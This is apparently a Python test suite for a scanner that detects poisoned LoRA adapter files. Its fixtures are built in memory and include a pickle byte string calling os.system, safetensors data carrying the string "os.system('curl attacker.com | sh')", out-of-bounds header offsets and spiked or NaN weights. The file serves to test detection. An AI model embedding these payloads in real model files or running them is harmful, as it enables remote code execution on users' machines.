"""tests/test_squash_b8_adapter.py — Track B / B8 — LoRA / Adapter Poisoning Detection.

Sprint 32 (W257–W258) exit criteria:
  * Statistical anomaly threshold tuned against ≥3 known-clean and ≥1 known-malicious
    adapter fixtures — all built in-memory as raw binary so no torch/ML deps needed.
  * Pickle-format input rejected before any deserialisation.
  * 0 unsafe deserialisation in any scan code path.

Fixture taxonomy
----------------
  CLEAN-1 : small safetensors adapter, 2 F32 tensors, Gaussian weights
  CLEAN-2 : safetensors adapter, 4 F32 tensors + embedding + lm_head (normal magnitudes)
  CLEAN-3 : safetensors adapter, BF16 tensors (common dtype for QLoRA)
  MALICIOUS-1 : pickle/PyTorch format with GLOBAL + REDUCE opcodes
  MALICIOUS-2 : safetensors with injected shell-command string in data bytes
  MALICIOUS-3 : safetensors with kurtosis-anomaly tensor (spike weights)
  MALICIOUS-4 : safetensors with out-of-bounds offset in header (OOB-read vector)
  MALICIOUS-5 : safetensors with NaN weights
"""

from __future__ import annotations

import argparse
import io
import json
import math
import os
import struct
import tempfile
import unittest
from pathlib import Path
from unittest import mock


# ── Fixture helpers ───────────────────────────────────────────────────────────


def _safetensors_bytes(tensors: dict[str, dict], data_chunks: dict[str, bytes]) -> bytes:
    """Build a valid safetensors binary from tensor descriptors + raw data."""
    # Build JSON header
    header_obj: dict = {}
    offset = 0
    ordered_chunks: list[tuple[str, bytes]] = []
    for name, meta in tensors.items():
        data = data_chunks[name]
        header_obj[name] = {
            "dtype": meta["dtype"],
            "shape": meta["shape"],
            "data_offsets": [offset, offset + len(data)],
        }
        ordered_chunks.append((name, data))
        offset += len(data)

    header_json = json.dumps(header_obj).encode("utf-8")
    # Pad to 8-byte alignment
    pad = (8 - len(header_json) % 8) % 8
    header_json += b" " * pad
    header_len = struct.pack("<Q", len(header_json))
    data_section = b"".join(d for _, d in ordered_chunks)
    return header_len + header_json + data_section


def _f32_tensor(values: list[float]) -> bytes:
    return struct.pack(f"<{len(values)}f", *values)


def _gaussian_tensor(n: int, std: float = 0.01, seed: int = 42) -> list[float]:
    """Box-Muller Gaussian samples — no numpy needed."""
    import math, random
    rng = random.Random(seed)
    result = []
    while len(result) < n:
        u1, u2 = rng.random(), rng.random()
        r = math.sqrt(-2 * math.log(max(u1, 1e-10)))
        result.append(r * math.cos(2 * math.pi * u2) * std)
        if len(result) < n:
            result.append(r * math.sin(2 * math.pi * u2) * std)
    return result[:n]


def _make_clean1(path: Path) -> None:
    """CLEAN-1: 2 F32 Gaussian LoRA matrices, rank 8."""
    t = {
        "lora_A": {"dtype": "F32", "shape": [8, 64]},
        "lora_B": {"dtype": "F32", "shape": [64, 8]},
    }
    d = {
        "lora_A": _f32_tensor(_gaussian_tensor(8 * 64, std=0.02)),
        "lora_B": _f32_tensor(_gaussian_tensor(64 * 8, std=0.02)),
    }
    path.write_bytes(_safetensors_bytes(t, d))


def _make_clean2(path: Path) -> None:
    """CLEAN-2: 4 F32 tensors including embed_tokens and lm_head with normal magnitudes."""
    t = {
        "model.layers.0.self_attn.q_proj.lora_A": {"dtype": "F32", "shape": [8, 128]},
        "model.layers.0.self_attn.q_proj.lora_B": {"dtype": "F32", "shape": [128, 8]},
        "model.embed_tokens.lora_A": {"dtype": "F32", "shape": [8, 64]},
        "lm_head.lora_B": {"dtype": "F32", "shape": [64, 8]},
    }
    d = {k: _f32_tensor(_gaussian_tensor(
        8 * 128 if "128" in str(v["shape"]) else 8 * 64, std=0.015))
        for k, v in t.items()}
    path.write_bytes(_safetensors_bytes(t, d))


def _make_clean3(path: Path) -> None:
    """CLEAN-3: BF16 tensors (QLoRA style)."""
    # BF16: upper 16 bits of float32
    def _bf16_tensor(values: list[float]) -> bytes:
        out = b""
        for v in values:
            packed = struct.pack("<f", v)
            out += packed[2:]  # upper 2 bytes
        return out

    vals = _gaussian_tensor(16 * 32, std=0.01)
    t = {"lora_A": {"dtype": "BF16", "shape": [16, 32]}}
    d = {"lora_A": _bf16_tensor(vals)}
    path.write_bytes(_safetensors_bytes(t, d))


def _make_malicious_pickle(path: Path) -> None:
    """MALICIOUS-1: Pickle with GLOBAL + REDUCE opcodes (never executed)."""
    # Build a pickle stream that contains code-execution opcodes in its body.
    # This is a CRAFTED byte sequence — not a valid deserialisation target.
    fake_pickle = (
        b"\x80\x04"        # PROTO 4
        b"\x95\x10\x00\x00\x00\x00\x00\x00\x00"  # FRAME
        b"\x63os\nsystem\n"  # GLOBAL os.system (0x63)
        b"\x52"             # REDUCE
        b"\x2e"             # STOP
    )
    path.write_bytes(fake_pickle)


def _make_malicious_shell_in_safetensors(path: Path) -> None:
    """MALICIOUS-2: Valid safetensors structure with shell string in data payload."""
    vals = _gaussian_tensor(8 * 16, std=0.01)
    raw_data = _f32_tensor(vals)
    # Inject shell pattern into the raw data section.
    injection = b"os.system('curl attacker.com | sh')"
    raw_data = raw_data[: len(raw_data) // 2] + injection + raw_data[len(raw_data) // 2 :]

    header_obj = {
        "lora_A": {
            "dtype": "F32",
            "shape": [8, 16],
            "data_offsets": [0, len(raw_data)],
        }
    }
    header_json = json.dumps(header_obj).encode()
    pad = (8 - len(header_json) % 8) % 8
    header_json += b" " * pad
    path.write_bytes(struct.pack("<Q", len(header_json)) + header_json + raw_data)


def _make_malicious_kurtosis(path: Path) -> None:
    """MALICIOUS-3: safetensors adapter with extreme kurtosis (spike weights)."""
    # Most weights near 0, then a handful of extreme spikes.
    n = 512
    vals = [0.0] * n
    # Inject 10 extreme outliers — classic backdoor weight insertion pattern.
    for i in [5, 11, 23, 47, 99, 200, 300, 400, 450, 500]:
        if i < n:
            vals[i] = 15.0  # extreme magnitude vs std ~0
    t = {"lora_A": {"dtype": "F32", "shape": [16, 32]}}
    d = {"lora_A": _f32_tensor(vals)}
    path.write_bytes(_safetensors_bytes(t, d))


def _make_malicious_oob(path: Path) -> None:
    """MALICIOUS-4: safetensors with data_offsets pointing past EOF."""
    header_obj = {
        "lora_A": {
            "dtype": "F32",
            "shape": [8, 16],
            "data_offsets": [0, 99999999],   # far beyond actual file
        }
    }
    header_json = json.dumps(header_obj).encode()
    pad = (8 - len(header_json) % 8) % 8
    header_json += b" " * pad
    real_data = _f32_tensor(_gaussian_tensor(8 * 16, std=0.01))
    path.write_bytes(struct.pack("<Q", len(header_json)) + header_json + real_data)


def _make_malicious_nan(path: Path) -> None:
    """MALICIOUS-5: safetensors adapter with NaN values."""
    vals = _gaussian_tensor(64, std=0.01)
    # Inject NaN
    vals[10] = float("nan")
    vals[30] = float("inf")
    t = {"lora_A": {"dtype": "F32", "shape": [8, 8]}}
    d = {"lora_A": _f32_tensor(vals)}
    path.write_bytes(_safetensors_bytes(t, d))


# ── detect_format ─────────────────────────────────────────────────────────────


class TestDetectFormat(unittest.TestCase):
    def test_safetensors_by_magic(self):
        from squash.adapter_scanner import detect_format
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "adapter.safetensors"
            _make_clean1(p)
            self.assertEqual(detect_format(p), "safetensors")

    def test_pickle_by_magic(self):
        from squash.adapter_scanner import detect_format
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "adapter.pkl"
            _make_malicious_pickle(p)
            self.assertEqual(detect_format(p), "pickle")

    def test_safetensors_by_extension_fallback(self):
        from squash.adapter_scanner import detect_format
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "adapter.safetensors"
            p.write_bytes(b"\x08\x00\x00\x00\x00\x00\x00\x00{}")
            self.assertEqual(detect_format(p), "safetensors")

    def test_unknown_format(self):
        from squash.adapter_scanner import detect_format
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "weights.ckpt"
            p.write_bytes(b"SOME_RANDOM_BYTES_XYZ")
            self.assertEqual(detect_format(p), "unknown")

    def test_nonexistent_file(self):
        from squash.adapter_scanner import detect_format
        self.assertEqual(detect_format(Path("/no/such/file.safetensors")), "unknown")


# ── scan_pickle_opcodes ───────────────────────────────────────────────────────


class TestScanPickleOpcodes(unittest.TestCase):
    def test_dangerous_opcodes_found_in_malicious_pickle(self):
        from squash.adapter_scanner import scan_pickle_opcodes
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "m.pkl"
            _make_malicious_pickle(p)
            found = scan_pickle_opcodes(p)
            self.assertIn("GLOBAL", found)
            self.assertIn("REDUCE", found)

    def test_no_shell_patterns_in_clean_safetensors(self):
        """scan_shell_patterns (not pickle-opcode scan) is used for safetensors."""
        from squash.adapter_scanner import scan_shell_patterns
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "a.safetensors"
            _make_clean1(p)
            found = scan_shell_patterns(p)
            self.assertEqual(found, [])

    def test_shell_pattern_detected(self):
        from squash.adapter_scanner import scan_pickle_opcodes
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "a.safetensors"
            _make_malicious_shell_in_safetensors(p)
            found = scan_pickle_opcodes(p)
            shell_hits = [f for f in found if "os.system" in f]
            self.assertTrue(len(shell_hits) > 0, found)


# ── parse_safetensors_header ──────────────────────────────────────────────────


class TestParseSafetensorsHeader(unittest.TestCase):
    def test_clean_header_parses_all_tensors(self):
        from squash.adapter_scanner import parse_safetensors_header
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "a.safetensors"
            _make_clean2(p)
            tensors, findings = parse_safetensors_header(p)
            self.assertEqual(len(tensors), 4)
            self.assertEqual(len([f for f in findings if f.severity == "critical"]), 0)

    def test_oob_offset_triggers_critical_finding(self):
        from squash.adapter_scanner import parse_safetensors_header
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "oob.safetensors"
            _make_malicious_oob(p)
            _, findings = parse_safetensors_header(p)
            codes = [f.code for f in findings]
            self.assertIn("ST-006", codes)

    def test_truncated_file_gives_critical(self):
        from squash.adapter_scanner import parse_safetensors_header
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "trunc.safetensors"
            p.write_bytes(b"\x00\x00")  # too short even for header len
            _, findings = parse_safetensors_header(p)
            self.assertTrue(any(f.severity == "critical" for f in findings))


# ── scan_adapter — clean fixtures ─────────────────────────────────────────────


class TestScanAdapterClean(unittest.TestCase):
    def test_clean1_gaussian_is_safe(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            _make_clean1(p)
            r = scan_adapter(p)
            self.assertTrue(r.safe)
            self.assertIn(r.risk_level, ("CLEAN", "LOW"))
            self.assertEqual(r.file_format, "safetensors")
            self.assertEqual(r.error, "")

    def test_clean2_embedding_normal_magnitude_is_safe(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c2.safetensors"
            _make_clean2(p)
            r = scan_adapter(p)
            self.assertTrue(r.safe, r.findings)
            self.assertIn(r.risk_level, ("CLEAN", "LOW", "MEDIUM"))

    def test_clean3_bf16_is_safe(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c3.safetensors"
            _make_clean3(p)
            r = scan_adapter(p)
            self.assertTrue(r.safe)
            # Either no findings or all at info/low severity.
            self.assertTrue(
                not r.findings or all(f.severity in ("info", "low") for f in r.findings),
                [(f.code, f.severity) for f in r.findings],
            )

    def test_adapter_hash_populated(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            _make_clean1(p)
            r = scan_adapter(p)
            self.assertEqual(len(r.adapter_hash), 64)
            self.assertTrue(all(c in "0123456789abcdef" for c in r.adapter_hash))

    def test_certificate_written_to_default_path(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            _make_clean1(p)
            r = scan_adapter(p)
            cert_path = Path(r.certificate_path)
            self.assertTrue(cert_path.exists(), r.certificate_path)
            cert = json.loads(cert_path.read_text())
            self.assertIn("report", cert)

    def test_signed_certificate_has_signature(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            _make_clean1(p)
            r = scan_adapter(p, sign=True)
            cert = json.loads(Path(r.certificate_path).read_text())
            self.assertIn("signature", cert)
            self.assertEqual(len(cert["signature"]), 64)  # SHA-256 hex

    def test_tensor_stats_populated(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            _make_clean1(p)
            r = scan_adapter(p)
            self.assertGreater(len(r.tensor_stats), 0)
            for ts in r.tensor_stats:
                self.assertFalse(ts.has_nan)
                self.assertFalse(ts.has_inf)

    def test_output_path_override(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            custom = Path(td) / "my-cert.json"
            _make_clean1(p)
            r = scan_adapter(p, output_path=custom)
            self.assertEqual(r.certificate_path, str(custom))
            self.assertTrue(custom.exists())


# ── scan_adapter — malicious fixtures ────────────────────────────────────────


class TestScanAdapterMalicious(unittest.TestCase):
    def test_malicious_pickle_is_critical(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "bad.pkl"
            _make_malicious_pickle(p)
            r = scan_adapter(p)
            self.assertFalse(r.safe)
            self.assertEqual(r.risk_level, "CRITICAL")
            self.assertEqual(r.file_format, "pickle")
            codes = [f.code for f in r.findings]
            self.assertIn("PK-001", codes)

    def test_pickle_with_require_safetensors_adds_pk003(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "bad.pkl"
            _make_malicious_pickle(p)
            r = scan_adapter(p, require_safetensors=True)
            codes = [f.code for f in r.findings]
            self.assertIn("PK-003", codes)
            self.assertEqual(r.risk_level, "CRITICAL")

    def test_shell_injection_in_safetensors_is_critical(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "injected.safetensors"
            _make_malicious_shell_in_safetensors(p)
            r = scan_adapter(p)
            self.assertFalse(r.safe)
            self.assertEqual(r.risk_level, "CRITICAL")
            codes = [f.code for f in r.findings]
            self.assertIn("SH-001", codes)

    def test_kurtosis_anomaly_raises_risk(self):
        from squash.adapter_scanner import scan_adapter, _KURTOSIS_THRESHOLD
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "spiked.safetensors"
            _make_malicious_kurtosis(p)
            r = scan_adapter(p)
            # Risk must be at least MEDIUM (kurtosis anomaly).
            self.assertIn(r.risk_level, ("MEDIUM", "HIGH", "CRITICAL"))
            codes = [f.code for f in r.findings]
            self.assertIn("WD-003", codes)
            spiked_ts = [ts for ts in r.tensor_stats if ts.kurtosis > _KURTOSIS_THRESHOLD]
            self.assertGreater(len(spiked_ts), 0)

    def test_oob_offset_is_critical(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "oob.safetensors"
            _make_malicious_oob(p)
            r = scan_adapter(p)
            self.assertFalse(r.safe)
            codes = [f.code for f in r.findings]
            self.assertIn("ST-006", codes)

    def test_nan_weights_flagged_high(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "nan.safetensors"
            _make_malicious_nan(p)
            r = scan_adapter(p)
            codes = [f.code for f in r.findings]
            self.assertIn("WD-001", codes)  # NaN
            self.assertIn("WD-002", codes)  # Inf


# ── require_safetensors edge cases ────────────────────────────────────────────


class TestRequireSafetensors(unittest.TestCase):
    def test_safetensors_passes_require_flag(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "ok.safetensors"
            _make_clean1(p)
            r = scan_adapter(p, require_safetensors=True)
            pk003_present = any(f.code == "PK-003" for f in r.findings)
            self.assertFalse(pk003_present)

    def test_unknown_format_with_require_flag_is_critical(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "weights.ckpt"
            p.write_bytes(b"RANDOM_BINARY_DATA_" + b"\x00" * 64)
            r = scan_adapter(p, require_safetensors=True)
            codes = [f.code for f in r.findings]
            self.assertIn("PK-003", codes)

    def test_missing_file_returns_critical(self):
        from squash.adapter_scanner import scan_adapter
        r = scan_adapter(Path("/no/such/adapter.safetensors"))
        self.assertFalse(r.safe)
        self.assertEqual(r.risk_level, "CRITICAL")
        self.assertIn("IO-001", [f.code for f in r.findings])


# ── High-value tensor detection ───────────────────────────────────────────────


class TestHighValueTensorDetection(unittest.TestCase):
    def test_embed_tokens_flagged_when_large_magnitude(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "embed.safetensors"
            # Large-magnitude embed_tokens LoRA
            vals = [20.0] * (8 * 16)   # max_abs = 20
            t = {"model.embed_tokens.lora_A": {"dtype": "F32", "shape": [8, 16]}}
            d = {"model.embed_tokens.lora_A": _f32_tensor(vals)}
            p.write_bytes(_safetensors_bytes(t, d))
            r = scan_adapter(p)
            codes = [f.code for f in r.findings]
            self.assertIn("WD-004", codes)

    def test_normal_magnitude_embed_not_flagged(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "embed_ok.safetensors"
            vals = _gaussian_tensor(8 * 16, std=0.01)
            t = {"model.embed_tokens.lora_A": {"dtype": "F32", "shape": [8, 16]}}
            d = {"model.embed_tokens.lora_A": _f32_tensor(vals)}
            p.write_bytes(_safetensors_bytes(t, d))
            r = scan_adapter(p)
            wd4 = [f for f in r.findings if f.code == "WD-004"]
            self.assertEqual(wd4, [])


# ── Weight concentration ──────────────────────────────────────────────────────


class TestWeightConcentration(unittest.TestCase):
    def test_concentration_score_between_0_and_1(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c2.safetensors"
            _make_clean2(p)
            r = scan_adapter(p)
            self.assertGreaterEqual(r.concentration_score, 0.0)
            self.assertLessEqual(r.concentration_score, 1.0)

    def test_single_tensor_concentration_is_1(self):
        from squash.adapter_scanner import scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "single.safetensors"
            _make_clean1(p)
            # Two tensors — pick the one carrying all mass
            r = scan_adapter(p)
            # With only 2 Gaussian tensors of equal size, concentration < 0.85
            self.assertLess(r.concentration_score, 0.95)


# ── CLI dispatcher ────────────────────────────────────────────────────────────


def _ns(**kw) -> argparse.Namespace:
    return argparse.Namespace(**kw)


class TestScanAdapterCli(unittest.TestCase):
    def test_clean_adapter_exits_0(self):
        from squash.cli import _cmd_scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            _make_clean1(p)
            rc = _cmd_scan_adapter(_ns(
                lora_path=str(p),
                require_safetensors=False,
                sign_cert=False,
                cert_output=None,
                output_json=False,
            ), quiet=True)
            self.assertEqual(rc, 0)

    def test_pickle_adapter_exits_nonzero(self):
        from squash.cli import _cmd_scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "m.pkl"
            _make_malicious_pickle(p)
            rc = _cmd_scan_adapter(_ns(
                lora_path=str(p),
                require_safetensors=False,
                sign_cert=False,
                cert_output=None,
                output_json=False,
            ), quiet=True)
            self.assertNotEqual(rc, 0)

    def test_json_output_flag_prints_json(self):
        from squash.cli import _cmd_scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            _make_clean1(p)
            buf = io.StringIO()
            with mock.patch("sys.stdout", buf):
                _cmd_scan_adapter(_ns(
                    lora_path=str(p),
                    require_safetensors=False,
                    sign_cert=False,
                    cert_output=None,
                    output_json=True,
                ), quiet=True)
            out = buf.getvalue()
            parsed = json.loads(out)
            self.assertIn("risk_level", parsed)
            self.assertIn("findings", parsed)

    def test_require_safetensors_flag_on_pickle_exits_2(self):
        from squash.cli import _cmd_scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "bad.pkl"
            _make_malicious_pickle(p)
            rc = _cmd_scan_adapter(_ns(
                lora_path=str(p),
                require_safetensors=True,
                sign_cert=False,
                cert_output=None,
                output_json=False,
            ), quiet=True)
            self.assertEqual(rc, 2)

    def test_sign_flag_adds_signature_to_cert(self):
        from squash.cli import _cmd_scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            cert_out = Path(td) / "cert.json"
            _make_clean1(p)
            _cmd_scan_adapter(_ns(
                lora_path=str(p),
                require_safetensors=False,
                sign_cert=True,
                cert_output=str(cert_out),
                output_json=False,
            ), quiet=True)
            self.assertTrue(cert_out.exists())
            cert = json.loads(cert_out.read_text())
            self.assertIn("signature", cert)

    def test_custom_output_path_honoured(self):
        from squash.cli import _cmd_scan_adapter
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "c1.safetensors"
            cert = Path(td) / "my-report.json"
            _make_clean1(p)
            _cmd_scan_adapter(_ns(
                lora_path=str(p),
                require_safetensors=False,
                sign_cert=False,
                cert_output=str(cert),
                output_json=False,
            ), quiet=True)
            self.assertTrue(cert.exists())


# ── Statistical threshold validation ─────────────────────────────────────────


class TestStatisticalThresholds(unittest.TestCase):
    """Verify that known-clean adapters stay below anomaly thresholds and
    known-malicious adapters exceed them — the core Sprint 32 exit criterion."""

    def _kurtosis_of(self, path: Path) -> list[float]:
        from squash.adapter_scanner import scan_adapter
        r = scan_adapter(path)
        return [ts.kurtosis for ts in r.tensor_stats]

    def test_three_clean_fixtures_have_low_kurtosis(self):
        from squash.adapter_scanner import _KURTOSIS_THRESHOLD
        with tempfile.TemporaryDirectory() as td:
            for i, make_fn in enumerate([_make_clean1, _make_clean2, _make_clean3]):
                p = Path(td) / f"clean{i}.safetensors"
                make_fn(p)
                kvals = self._kurtosis_of(p)
                high = [k for k in kvals if abs(k) > _KURTOSIS_THRESHOLD]
                self.assertEqual(high, [],
                    f"Clean fixture {i} has high kurtosis tensors: {kvals}")

    def test_malicious_kurtosis_fixture_exceeds_threshold(self):
        from squash.adapter_scanner import _KURTOSIS_THRESHOLD
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "spiked.safetensors"
            _make_malicious_kurtosis(p)
            kvals = self._kurtosis_of(p)
            self.assertTrue(any(k > _KURTOSIS_THRESHOLD for k in kvals),
                f"Malicious kurtosis fixture did not exceed threshold: {kvals}")


if __name__ == "__main__":
    unittest.main()
